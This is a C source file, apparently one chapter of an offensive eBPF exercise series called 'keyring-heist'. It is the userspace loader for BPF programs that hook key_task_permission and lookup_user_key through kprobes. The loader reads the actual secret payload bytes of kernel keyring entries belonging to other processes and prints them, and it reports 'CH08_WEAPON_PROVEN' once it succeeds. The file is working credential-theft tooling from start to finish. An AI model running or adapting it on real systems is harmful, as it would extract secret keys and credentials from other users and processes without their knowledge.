// ch08 keyring-heist — userspace loader with PAYLOAD EXFILTRATION.
//
// Observes key_task_permission + lookup_user_key via kprobes. Reads key
// metadata AND the actual payload bytes (the secret) from kernel memory
// via bpf_probe_read_kernel. Streams exfiltrated payloads through ringbuf.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <ctype.h>
#include <getopt.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch08-keyring-heist.skel.h"

#define PAYLOAD_CAP 128

struct evt {
    unsigned int pid;
    char comm[16];
    int serial;
    unsigned int datalen;
    char type[16];
    char desc[64];
    int hook;
    unsigned int exfil_len;
    char payload[PAYLOAD_CAP];
};

static volatile sig_atomic_t stop;
static unsigned long long total_events;
static unsigned long long exfil_events;

static void on_sig(int s){ (void)s; stop = 1; }

static const char *hname(int h)
{
    switch (h) { case 1: return "key_task_perm"; case 2: return "lookup_user_key"; default: return "?"; }
}

// Print payload as printable string + hex dump for non-printable bytes.
static void print_payload(const char *data, unsigned int len)
{
    if (len == 0) {
        printf("(empty)");
        return;
    }
    // Check if all printable
    int all_print = 1;
    for (unsigned int i = 0; i < len; i++) {
        if (!isprint((unsigned char)data[i]) && data[i] != '\0') {
            all_print = 0;
            break;
        }
    }
    if (all_print) {
        printf("'%.*s'", (int)len, data);
    } else {
        for (unsigned int i = 0; i < len && i < 64; i++)
            printf("%02x", (unsigned char)data[i]);
        if (len > 64)
            printf("...");
    }
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx;
    if (sz < sizeof(struct evt)) return 0;
    const struct evt *e = data;
    total_events++;
    printf("[ch08] hook=%-15s\tpid=%u\tcomm=%-16s\tserial=0x%x\ttype=%s\tdesc='%s'\tlen=%u",
           hname(e->hook), e->pid, e->comm, e->serial, e->type, e->desc, e->datalen);

    if (e->exfil_len > 0) {
        exfil_events++;
        printf("\tEXFIL=");
        print_payload(e->payload, e->exfil_len);
    }
    printf("\n");
    fflush(stdout);
    return 0;
}

static int kallsyms_has(const char *sym)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return -1;
    char line[512]; int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char *p = strchr(line, ' '); if (!p) continue;
        char type = p[1];
        if (type != 'T' && type != 't' && type != 'W' && type != 'w')
            continue;
        p = strchr(p+1, ' '); if (!p) continue; p++;
        size_t n = strlen(p);
        while (n && (p[n-1]=='\n'||p[n-1]=='\t'||p[n-1]==' ')) p[--n]=0;
        char *t = strchr(p, '\t'); if (t) *t = 0;
        if (!strcmp(p, sym)) { found = 1; break; }
    }
    fclose(f); return found;
}

static void usage(const char *a)
{
    fprintf(stderr,
        "Usage: %s [-v] [-h]\n"
        "  -v  verbose libbpf output\n"
        "  -h  show this help\n"
        "\n"
        "Hooks key_task_permission + lookup_user_key and exfiltrates\n"
        "actual key payload bytes (the secret) via bpf_probe_read_kernel.\n",
        a);
}

int main(int argc, char **argv)
{
    int verbose = 0;
    int c;
    while ((c = getopt(argc, argv, "vh")) != -1) {
        switch (c) {
        case 'v': verbose = 1; break;
        case 'h': usage(argv[0]); return 0;
        default: usage(argv[0]); return 2;
        }
    }
    if (optind != argc) {
        fprintf(stderr, "[ch08] unexpected argument: %s\n", argv[optind]);
        usage(argv[0]);
        return 2;
    }

    (void)verbose;  // TODO: wire to libbpf_set_print

    int has_ktp = kallsyms_has("key_task_permission");
    int has_luk = kallsyms_has("lookup_user_key");
    fprintf(stderr, "[ch08] symbol=key_task_permission\tstatus=%s\n",
            has_ktp == 1 ? "present" : "absent");
    fprintf(stderr, "[ch08] symbol=lookup_user_key\tstatus=%s\n",
            has_luk == 1 ? "present" : "absent");

    if (has_ktp != 1 && has_luk != 1) {
        fprintf(stderr, "[ch08] CH08_SKIP reason=\"keyring symbols absent\"\n");
        return 2;
    }

    int rc = 1;
    struct ring_buffer *rb = NULL;
    struct ch08_keyring_heist_bpf *s = ch08_keyring_heist_bpf__open();
    if (!s) {
        fprintf(stderr, "[ch08] CH08_SKIP reason=\"open: %s\"\n", strerror(errno));
        return 1;
    }
    if (has_ktp != 1)
        bpf_program__set_autoload(s->progs.kp_ktp, false);
    if (has_luk != 1)
        bpf_program__set_autoload(s->progs.kp_luk, false);

    int err = ch08_keyring_heist_bpf__load(s);
    if (err) {
        fprintf(stderr, "[ch08] CH08_SKIP reason=\"load: %s\"\n", strerror(-err));
        goto out;
    }
    err = ch08_keyring_heist_bpf__attach(s);
    if (err) {
        fprintf(stderr, "[ch08] CH08_SKIP reason=\"attach: %s\"\n", strerror(-err));
        goto out;
    }

    rb = ring_buffer__new(bpf_map__fd(s->maps.events), handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch08] ring_buffer__new: %s\n", strerror(errno));
        goto out;
    }

    struct sigaction sa = { .sa_handler = on_sig };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    fprintf(stderr, "[ch08] status=ready\tmsg=keyring heist active (payload exfil enabled)\n");

    while (!stop) {
        int n = ring_buffer__poll(rb, 200);
        if (n < 0 && n != -EINTR) break;
    }
    rc = 0;

    fprintf(stderr, "[ch08] total_events=%llu exfil_events=%llu\n",
            total_events, exfil_events);
    if (exfil_events > 0)
        printf("[ch08] CH08_WEAPON_PROVEN exfil_count=%llu total=%llu\n",
               exfil_events, total_events);
    else if (total_events >= 3)
        printf("[ch08] CH08_PROVEN events=%llu (metadata only, payload read failed)\n",
               total_events);

out:
    if (rb) ring_buffer__free(rb);
    if (s) ch08_keyring_heist_bpf__destroy(s);
    return rc;
}
